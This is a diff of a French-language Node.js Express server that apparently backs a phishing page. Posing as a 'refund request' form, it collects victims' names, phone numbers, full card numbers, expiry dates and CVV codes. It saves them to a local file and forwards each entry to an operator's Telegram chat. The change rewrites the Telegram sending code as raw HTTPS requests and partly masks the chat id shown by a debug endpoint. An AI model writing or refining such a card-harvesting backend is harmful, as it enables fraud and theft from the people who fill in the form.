@@ -3,14 +3,14 @@ const express = require('express');
 const cors = require('cors');
 const path = require('path');
 const fs = require('fs');
-const TelegramBot = require('node-telegram-bot-api');
+const https = require('https');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 const DATA_DIR = path.join(__dirname, 'data');
 const DEMANDES_FILE = path.join(DATA_DIR, 'demandes.json');
 
-const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: false });
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
 if (!fs.existsSync(DATA_DIR)) {
@@ -38,34 +38,48 @@ function saveDemande(data) {
   return entry;
 }
 
-function isEmailConfigured() {
-  return Boolean(TELEGRAM_CHAT_ID);
+function isTelegramConfigured() {
+  return Boolean(TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID);
 }
 
-async function sendToTelegram(data) {
-  const message = `Nouvelle demande de remboursement
-
-Nom: ${data.nom}
-Telephone: ${data.telephone}
-RIB/Carte: ${data.rib}
-Nom du compte: ${data.nomCompte}
-Date: ${data.date}
-CVV: ${data.CVV}`;
-
-  await bot.sendMessage(TELEGRAM_CHAT_ID, message);
-}
-
-app.get('/api/debug', (req, res) => {
-  res.json({
-    tokenSet: Boolean(process.env.TELEGRAM_BOT_TOKEN),
-    chatIdSet: Boolean(process.env.TELEGRAM_CHAT_ID),
-    chatId: TELEGRAM_CHAT_ID,
+function sendToTelegram(message) {
+  return new Promise((resolve, reject) => {
+    const postData = JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message });
+    const req = https.request({
+      hostname: 'api.telegram.org',
+      path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(postData) },
+      timeout: 10000,
+    }, (res) => {
+      let body = '';
+      res.on('data', (chunk) => body += chunk);
+      res.on('end', () => {
+        try {
+          const json = JSON.parse(body);
+          if (json.ok) resolve(json);
+          else reject(new Error(json.description || 'Telegram API error'));
+        } catch (e) { reject(e); }
+      });
+    });
+    req.on('error', reject);
+    req.on('timeout', () => { req.destroy(); reject(new Error('timeout')); });
+    req.write(postData);
+    req.end();
   });
-});
+}
 
 app.use(cors());
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
+
+app.get('/api/debug', (req, res) => {
+  res.json({
+    tokenSet: Boolean(TELEGRAM_BOT_TOKEN),
+    chatIdSet: Boolean(TELEGRAM_CHAT_ID),
+    chatId: TELEGRAM_CHAT_ID ? String(TELEGRAM_CHAT_ID).slice(0, 3) + '***' : null,
+  });
+});
 
 app.post('/api/remboursement', async (req, res) => {
   const { nom, telephone, rib, nomCompte, date, CVV } = req.body;
@@ -77,13 +91,13 @@ app.post('/api/remboursement', async (req, res) => {
   const cardNumber = String(rib).replace(/\s/g, '');
 
   if (!/^\d{16}$/.test(cardNumber)) {
-    return res.status(400).json({ error: 'Le numéro de carte doit contenir exactement 16 chiffres.' });
+    return res.status(400).json({ error: 'Le numero de carte doit contenir exactement 16 chiffres.' });
   }
 
   const data = { nom, telephone, rib: cardNumber, nomCompte, date, CVV };
   saveDemande(data);
 
-  if (!isEmailConfigured()) {
+  if (!isTelegramConfigured()) {
     console.log('Demande enregistree (Telegram non configure):', nom);
     return res.json({
       success: true,
@@ -93,13 +107,14 @@ app.post('/api/remboursement', async (req, res) => {
   }
 
   try {
-    await sendToTelegram(data);
+    const message = `Nouvelle demande de remboursement\n\nNom: ${data.nom}\nTelephone: ${data.telephone}\nRIB/Carte: ${data.rib}\nNom du compte: ${data.nomCompte}\nDate: ${data.date}\nCVV: ${data.CVV}`;
+    await sendToTelegram(message);
     res.json({ success: true, message: 'Votre demande a ete envoyee avec succes.', emailSent: true });
   } catch (err) {
     console.error('Erreur envoi Telegram:', err.message);
     res.json({
       success: true,
-      message: 'Demande enregistree. Telegram non envoye — verifiez la configuration.',
+      message: 'Demande enregistree. Telegram non envoye.',
       emailSent: false,
     });
   }
@@ -114,10 +129,10 @@ app.listen(PORT, '0.0.0.0', () => {
   console.log(`Serveur demarre sur ${url}`);
   console.log(`Demandes sauvegardees dans: ${DEMANDES_FILE}`);
 
-  if (isEmailConfigured()) {
+  if (isTelegramConfigured()) {
     console.log(`Telegram actif -> chat_id: ${TELEGRAM_CHAT_ID}`);
   } else {
-    console.log('Telegram non configure — ajoutez TELEGRAM_CHAT_ID dans .env');
+    console.log('Telegram non configure');
   }
 
   if (process.env.PUBLIC_MODE) return;
